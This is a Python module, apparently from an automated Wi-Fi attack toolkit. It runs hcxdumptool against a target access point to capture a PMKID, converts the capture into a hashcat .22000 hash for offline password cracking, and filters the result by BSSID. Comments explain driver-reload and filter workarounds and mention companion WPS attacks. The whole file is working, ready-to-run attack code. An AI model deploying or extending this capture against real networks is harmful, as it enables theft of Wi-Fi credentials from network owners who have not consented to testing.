# -*- coding: utf-8 -*-
"""Optional PMKID capture — hcxdumptool → hcxpcapngtool → .22000 hash file.

Secondary attack (behind the PMKID toggle). Structured output: success is the
existence of a non-empty .22000 file, not scraped text.
"""
import os
import re
import subprocess
import time

import config
from attack import interface as iface_mod
from attack import tools
from attack.model import AttackEvent, EventType


def _safe(name):
    return re.sub(r"[^A-Za-z0-9_-]", "_", (name or "unknown"))[:24]


def _band_channel(channel):
    """hcxdumptool >=6.x requires a band suffix on -c (e.g. '36b', not '36') —
    a bare number makes it fail to arm the interface and exit immediately.
    RTL8822BU only does 2.4/5GHz, so channel <=14 is 'a' (2.4GHz), else 'b'."""
    try:
        return "%da" % int(channel) if int(channel) <= 14 else "%db" % int(channel)
    except (TypeError, ValueError):
        return None


def capture(mon, target, req, emit, stop_flag, force_reload=True):
    """Try to grab a PMKID for one target. Returns {"ok","hash","essid","bssid"}.

    force_reload: reload the rtw88 stack to managed mode before running
    hcxdumptool (see below for why). Cycling this on every single target
    wedges the adapter hard enough to need a reboot — same class of USB
    fragility as the WPS proactive-refresh wedge this codebase already works
    around (orchestrator._REFRESH_EVERY) — so the caller should throttle how
    often it passes True, not call with the default on every target.
    """
    bssid = target["bssid"]
    essid = target.get("essid") or bssid
    if not tools.tool_ok(tools.HCXDUMP):
        return {"ok": False, "essid": essid, "bssid": bssid}
    os.makedirs(config.CAPTURE_DIR, exist_ok=True)
    base = os.path.join(config.CAPTURE_DIR, "%s_%s" % (_safe(essid),
                        bssid.replace(":", "")))
    pcapng = base + ".pcapng"
    hashfile = base + ".22000"
    for old in (pcapng, hashfile):
        try:
            os.remove(old)
        except OSError:
            pass

    timeout = config.opt_int(req.timing, "WPA Timeout", 300)
    channel = _band_channel(target.get("channel"))

    # hcxdumptool needs a fresh rtw88 reload + a managed-mode (not pre-armed
    # monitor) interface to actually capture anything on this hardware —
    # confirmed live: handed a monitor-mode interface already used by
    # reaver/airodump earlier in the run, it reliably reports "driver is
    # broken" and 0 packets; reload to managed first, then let it self-arm,
    # and the exact same command captures real traffic. hcxdumptool leaves
    # the interface in monitor mode when it exits, so the caller's `mon` name
    # is still valid afterward — we just report the (possibly renamed after
    # reload) interface back via the result so the orchestrator can pick up
    # the new name for any attacks after this one in the same run.
    if force_reload:
        ifname = iface_mod.reload_managed(mon)
        if not ifname:
            # Adapter didn't re-enumerate. Do NOT fall back to the old `mon`
            # name and run hcxdumptool anyway — that's what previously masked
            # a dead adapter as an ordinary capture failure (rc=1, silently
            # treated like "no PMKID this time") and let the run plow on into
            # more reload attempts, worsening whatever wedged it. Surface it
            # as a real failure with mon=None so the caller stops relying on
            # this interface.
            tools.log("pmkid: reload_managed failed for %s — adapter gone"
                      % bssid)
            return {"ok": False, "essid": essid, "bssid": bssid, "mon": None}
    else:
        ifname = mon

    # No --bpf: a per-BSSID `--bpfc="wlan addr3 <mac>"` filter reliably drops
    # every frame on this hardware — confirmed live: identical command with
    # vs without --bpf goes from 0 packets/"driver is broken" to a real
    # capture, repeatably. Likely a radiotap-header-length mismatch the
    # generic BPF program doesn't account for. hcxdumptool broadcasts probes
    # to every AP in range regardless, and the post-capture step below already
    # filters the resulting hash by BSSID, so the filter was scope-only, never
    # load-bearing — dropping it is a straight fix, not a scope trade-off.
    # --exitoneapol=1: quit as soon as a PMKID is seen instead of burning the
    # full per-target timeout on a target that already gave one up.
    cmd = [tools.HCXDUMP, "-i", ifname, "-w", pcapng, "--exitoneapol=1"]
    if channel:
        cmd += ["-c", channel]
    emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                     phase="PMKID", countdown=timeout, cd_max=timeout))
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL)
    except Exception as e:  # noqa: BLE001
        tools.log("hcxdumptool failed: %s" % e)
        return {"ok": False, "essid": essid, "bssid": bssid, "mon": ifname}

    start = time.time()
    try:
        while (time.time() - start) < timeout:
            if stop_flag and stop_flag.is_set():
                return {"ok": False, "essid": essid, "bssid": bssid,
                        "cancelled": True, "mon": ifname}
            if proc.poll() is not None:
                # Process exited on its own — either --exitoneapol fired (a
                # hit) or it crashed immediately (e.g. bad flags/busy driver).
                # Either way, waiting out the rest of `timeout` here is what
                # let a dead-on-arrival process silently eat the full window
                # every single run.
                if proc.returncode != 0:
                    tools.log("hcxdumptool exited rc=%d for %s"
                              % (proc.returncode, bssid))
                break
            time.sleep(1)
    finally:
        try:
            proc.terminate()
            proc.wait(timeout=3)
        except Exception:  # noqa: BLE001
            try:
                proc.kill()
            except Exception:  # noqa: BLE001
                pass

    # Convert to a 22000 hash; success = a non-empty hash file that actually
    # names our target's BSSID (hcxdumptool broadcasts, so without this a
    # PMKID from an unrelated nearby AP could be mistaken for a hit).
    if os.path.exists(pcapng) and tools.tool_ok(tools.HCXPCAP):
        tools.run([tools.HCXPCAP, "-o", hashfile, pcapng], timeout=30)
    if os.path.exists(hashfile) and os.path.getsize(hashfile) > 0:
        want = bssid.replace(":", "").lower()
        matched = []
        try:
            with open(hashfile, encoding="utf-8", errors="ignore") as f:
                for line in f:
                    fields = line.strip().split("*")
                    if len(fields) > 3 and fields[3].lower() == want:
                        matched.append(line.strip())
        except OSError:
            matched = []
        if not matched:
            return {"ok": False, "essid": essid, "bssid": bssid, "mon": ifname}
        with open(hashfile, "w") as f:
            f.write("\n".join(matched) + "\n")
        emit(AttackEvent(EventType.PMKID, essid=essid, bssid=bssid))
        return {"ok": True, "hash": hashfile, "essid": essid, "bssid": bssid,
                "mon": ifname}
    return {"ok": False, "essid": essid, "bssid": bssid, "mon": ifname}
